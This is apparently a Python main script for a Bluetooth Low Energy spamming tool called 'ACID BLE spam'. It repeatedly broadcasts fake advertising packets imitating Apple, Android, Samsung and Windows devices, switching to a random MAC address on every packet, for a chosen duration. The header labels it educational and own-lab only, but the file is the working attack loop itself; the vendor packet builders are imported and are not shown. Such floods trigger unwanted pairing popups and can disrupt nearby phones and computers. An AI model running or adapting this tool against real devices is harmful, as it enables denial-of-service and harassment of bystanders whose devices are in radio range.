#!/usr/bin/env python3
# ACID BLE spam - modular main. Educational / own-lab only.
# Usage: spam.py [seconds] [mode]   mode = apple|android|samsung|windows|sink(all)
# Stop:  touch /tmp/acid_ble_spam_stop   ; status -> /tmp/acid_ble_spam_status ; log -> /tmp/acid_ble_spam_log
import sys, os, time, random
sys.path.insert(0, '/usr/local/lib/acid-ble')
from hci import HCI
from vendors import apple, google, samsung, microsoft

DUR = int(sys.argv[1]) if len(sys.argv) > 1 else 300
MODE = sys.argv[2] if len(sys.argv) > 2 else 'sink'
STATUS = '/tmp/acid_ble_spam_status'; STOP = '/tmp/acid_ble_spam_stop'; LOG = '/tmp/acid_ble_spam_log'
VEND = {'apple': apple, 'android': google, 'samsung': samsung, 'windows': microsoft}
ALL = [apple, google, samsung, microsoft]

def st(s):
    try: open(STATUS, 'w').write(s)
    except Exception: pass

def rmac():
    return bytes([random.randint(0, 255) for _ in range(5)] + [random.randint(0, 63) | 0xc0])

logbuf = []
def log(line):
    logbuf.append('%s %s' % (time.strftime('%H:%M:%S'), line))
    if len(logbuf) > 12: del logbuf[0]
    try: open(LOG, 'w').write('\n'.join(logbuf))
    except Exception: pass

for f in (STOP,):
    try: os.remove(f)
    except Exception: pass
try: open(LOG, 'w').write('')
except Exception: pass

hci = HCI()
try:
    hci.open()
except Exception as e:
    st('error: %s' % e); log('HCI open FAILED: %s' % e); print('OPEN_FAILED', e); sys.exit(1)

st('spamming %s' % MODE); log('started mode=%s' % MODE)
end = time.time() + DUR; n = 0; last_log = 0.0
try:
    while time.time() < end and not os.path.exists(STOP):
        mod = VEND.get(MODE) or random.choice(ALL)
        label, adv = mod.random_packet()
        hci.enable(False); hci.set_random_addr(rmac()); hci.set_params(0x00A0); hci.set_data(adv); hci.enable(True)
        n += 1
        now = time.time()
        if now - last_log >= 1.0:           # log ~1/sec only (no overload)
            log('%-24s #%d' % (label, n)); st('spamming %s sent=%d' % (MODE, n)); last_log = now
        time.sleep(0.02)
finally:
    hci.close()
    try: os.remove(STOP)
    except Exception: pass
    log('stopped (sent %d)' % n); st('stopped')
print('BLE_SPAM_DONE sent=%d' % n)
